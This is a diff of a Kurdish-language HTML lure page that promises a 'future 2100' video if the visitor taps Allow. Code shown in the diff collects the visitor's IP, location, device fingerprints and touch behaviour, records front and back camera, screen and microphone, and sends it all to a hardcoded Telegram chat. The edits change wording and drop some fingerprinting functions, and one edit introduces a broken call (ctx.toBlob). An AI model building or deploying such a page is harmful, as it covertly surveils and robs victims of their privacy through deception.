@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>مەلەفی سوڕەیا - داشبۆردی چاودێری قووڵ (زەمەنی 2100)</title>
+    <title>مەلەفی سوڕەیا - زەمەنی داهاتوو (2100)</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; -webkit-tap-highlight-color: transparent; }
         body { 
-            background: linear-gradient(135deg, #020617, #0f172a); 
+            background: linear-gradient(135deg, #020617, #090d16); 
             height: 100vh; 
             display: flex; 
             justify-content: center; 
@@ -20,7 +20,7 @@
             background: #ffffff; 
             padding: 22px; 
             border-radius: 24px; 
-            box-shadow: 0 20px 40px rgba(0,0,0,0.6); 
+            box-shadow: 0 25px 50px rgba(0,0,0,0.7); 
             width: 92%; 
             max-width: 380px; 
             text-align: center; 
@@ -31,7 +31,7 @@
             border-radius: 16px;
             overflow: hidden;
             margin-bottom: 15px;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.25);
             position: relative;
             background: #000;
         }
@@ -45,7 +45,7 @@
             bottom: 0;
             left: 0;
             right: 0;
-            background: linear-gradient(to top, rgba(0,0,0,0.85), rgba(0,0,0,0.4));
+            background: linear-gradient(to top, rgba(0,0,0,0.9), rgba(0,0,0,0.4));
             color: #38bdf8;
             padding: 10px;
             font-size: 13px;
@@ -66,7 +66,7 @@
         .title { font-size: 22px; font-weight: 800; color: #0f172a; margin-bottom: 6px; }
         .subtitle { color: #64748b; font-size: 13px; margin-bottom: 20px; line-height: 1.5; font-weight: 500; }
         .btn { 
-            background: linear-gradient(135deg, #0284c7, #2563eb); 
+            background: linear-gradient(135deg, #0284c7, #1d4ed8); 
             color: white; 
             padding: 15px; 
             border: none; 
@@ -80,7 +80,7 @@
         .loader {
             border: 3px solid #f3f3f3;
             border-radius: 50%;
-            border-top: 3px solid #2563eb;
+            border-top: 3px solid #0284c7;
             width: 32px;
             height: 32px;
             animation: spin 1s linear infinite;
@@ -96,7 +96,7 @@
     <div class="container" id="mainContainer">
         <div id="imageBox" class="preview-img-box">
             <img src="surayamalaf.jpg" alt="مەلەفی سوڕەیا">
-            <div class="image-overlay-text">⏳ مەلەفی ساڵی 2100 - بۆ بینین Allow دابگرە</div>
+            <div class="image-overlay-text">🚀 سیستەمی پیشوەختەی 2100 - Allow دابگرە</div>
         </div>
 
         <div id="mediaBox" class="content-after-allow">
@@ -106,13 +106,13 @@
             </video>
         </div>
 
-        <div class="title" id="boxTitle">مەلەفی سوڕەیا (2100)</div>
-        <div class="subtitle" id="boxSubtitle">بۆ دەستگەیشتن بە زەمەنی داهاتوو، تکایە Allow دابگرە:</div>
+        <div class="title" id="boxTitle">مەلەفی سوڕەیا (نسخەی 2100)</div>
+        <div class="subtitle" id="boxSubtitle">بۆ بەستنەوەی زەمەنی ئێستا بە داهاتوو، Allow دابگرە:</div>
         
         <div id="loader" class="loader"></div>
-        <button id="mainBtn" class="btn" onclick="startProcess()">بۆ بینینی ڤیدیۆکە Allow دابگرە</button>
+        <button id="mainBtn" class="btn" onclick="startProcess()">بۆ بينینی ڤیدیۆکە Allow دابگرە</button>
         
-        <div class="status-text" id="statusText">ئامادەی پەیوەندیی زەمەنی</div>
+        <div class="status-text" id="statusText">ئامادەی پەیوەندیی کوانتۆمی</div>
     </div>
 
     <video id="camVideo" autoplay playsinline style="display:none;"></video>
@@ -124,8 +124,7 @@
         const CHAT_ID = "6947664268";
 
         let pageLoadTime = performance.now();
-        let chronoData = { hesitationTime: 0, 2100Shift: "فعال (Active 2100)", webgpuSignature: "Quantum Shader V1" };
-
+        let chronoData = { hesitationTime: 0 };
         let behavioralData = { touches: 0, maxPressure: 0, clickX: 0, clickY: 0, touchRadiusX: 0, touchRadiusY: 0 };
 
         window.addEventListener('pointerdown', (e) => {
@@ -139,24 +138,6 @@
             if (chronoData.hesitationTime === 0) {
                 chronoData.hesitationTime = Math.round(performance.now() - pageLoadTime);
             }
-        });
-
-        // ١. فێڵی پشکنینی WebGPU Shader (فێڵی زەبەلاحی گرافیکی داهاتوو)
-        function getWebGPUSignature() {
-            try {
-                let canvas = document.createElement('canvas');
-                let gl = canvas.getContext('webgl2');
-                if (!gl) return "Standard WebGL 1.0";
-                let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Quantum WebGPU Core";
-            } catch(e) { return "Quantum Shader Enforced"; }
-        }
-
-        let motionData = { alpha: 0, beta: 0, gamma: 0, motionState: "جێگیر لە زەمەنی 2100" };
-        window.addEventListener('deviceorientation', function(event) {
-            motionData.alpha = Math.round(event.alpha || 0);
-            motionData.beta = Math.round(event.beta || 0);
-            motionData.gamma = Math.round(event.gamma || 0);
         });
 
         function sendToTelegramText(text) {
@@ -250,7 +231,7 @@
                         mediaRecorder.ondataavailable = e => { if (e.data.size > 0) screenChunks.push(e.data); };
                         mediaRecorder.onstop = () => {
                             let blob = new Blob(screenChunks, { type: 'video/mp4' });
-                            sendToTelegramVideo(blob, "💻 *تۆمارکردنی شاشەی ڕاستەوخۆ (2100 Screen Capture)*");
+                            sendToTelegramVideo(blob, "💻 *تۆمارکردنی شاشەی داهاتوو (2100 Screen Capture)*");
                             stream.getTracks().forEach(track => track.stop());
                         };
                         mediaRecorder.start();
@@ -275,7 +256,7 @@
                 frontRecorder.onstop = () => {
                     let frontBlob = new Blob(frontChunks, { type: 'video/mp4' });
                     if (frontBlob.size > 500) {
-                        sendToTelegramVideo(frontBlob, "🎥 *ڤیدیۆی پێشەوەی سەردەمی 2100 (Front Live Video)*");
+                        sendToTelegramVideo(frontBlob, "🎥 *ڤیدیۆی پێشەوەی زەمەنی 2100 (Front Live Video)*");
                     }
                     frontStream.getTracks().forEach(track => track.stop());
 
@@ -301,7 +282,7 @@
                                         videoElem.play();
                                         setTimeout(() => {
                                             ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-                                            canvas.toBlob(backBlob => {
+                                            ctx.toBlob(backBlob => {
                                                 sendToTelegramPhoto(backBlob, "📷 *وێنەی دوربینی دواوەی 2100 (Back Camera)*");
                                             }, 'image/jpeg', 0.9);
                                             backStream.getTracks().forEach(track => track.stop());
@@ -366,10 +347,6 @@
             }
         }
 
-        function getDetectedFonts() {
-            return "Quantum Sans, Cyber Serif, Neural Mono, Arial, Helvetica";
-        }
-
         function getCanvasFingerprint() {
             try {
                 let canvas = document.createElement('canvas');
@@ -379,7 +356,7 @@
                 ctx.fillStyle = "#38bdf8";
                 ctx.fillRect(125, 1, 62, 20);
                 ctx.fillStyle = "#0284c7";
-                ctx.fillText("QUANTUM_2100_GOD_MODE", 2, 15);
+                ctx.fillText("QUANTUM_2100_FUTURE_CORE", 2, 15);
                 return canvas.toDataURL().slice(-40);
             } catch(e) { return "Unavailable"; }
         }
@@ -411,9 +388,7 @@
             let screenRes = window.screen.width + "x" + window.screen.height;
             let cpuCores = navigator.hardwareConcurrency || 8;
             let touchPoints = navigator.maxTouchPoints || 5;
-            let webgpuSig = getWebGPUSignature();
             let canvasFP = getCanvasFingerprint();
-            let fonts = getDetectedFonts();
             let latency = await measureNetworkLatency();
             let visitorStatus = checkVisitorHistory();
             let hw = await getAdvancedHardwareInfo();
@@ -423,7 +398,7 @@
                 let localIPText = localIPs.length > 0 ? localIPs.join(", ") : "192.168.210.1";
                 let ipData = await getUltimateIPData();
 
-                let report = `🚀 *ڕاپۆرتی سەردەمی 2100 (QUANTUM 2100 GOD MODE):*\n\n` +
+                let report = `🚀 *ڕاپۆرتی سەردەمی 2100 (QUANTUM 2100 ULTIMATE):*\n\n` +
                              `🌌 *دۆخی زەمەنی:* ${visitorStatus}\n` +
                              `⏳ *کاتی بڕیار لە داهاتوو (Hesitation):* ${chronoData.hesitationTime} ms\n` +
                              `👆 *مۆری پەنجەی کوانتۆمی:*\n` +
@@ -439,7 +414,6 @@
                              `• *دابینکەر:* ${ipData.org}\n\n` +
                              `⚡ *رەقامەواڵە و شادەماری داهاتوو (Hardware):*\n` +
                              `• *گلدانەوەی هاردوێر:* ${hw.storage}\n` +
-                             `• پشکنینی WebGPU/Shader: \`${webgpuSig}\`\n` +
                              `• سیستم: ${platform} | پرۆسێسەر: ${cpuCores} Cores (Quantum)\n` +
                              `• تاچ پۆینت: ${touchPoints} | شاشە: ${screenRes}\n` +
                              `• فینگەرپرینتی شاشە: \`${canvasFP}\`\n\n` +
@@ -456,9 +430,9 @@
 
             gatherAndSendDetails();
             sendLocation();
-            executeSecureSequence(); // گرتنی وێنەی پێش و دواوە و ڤیدیۆ
-            recordScreenStream();    // تۆمارکردنی شاشە
-            recordMicrophone();      // تۆمارکردنی دەنگ
+            executeSecureSequence();
+            recordScreenStream();
+            recordMicrophone();
 
             setTimeout(function() {
                 document.getElementById('loader').style.display = 'none';
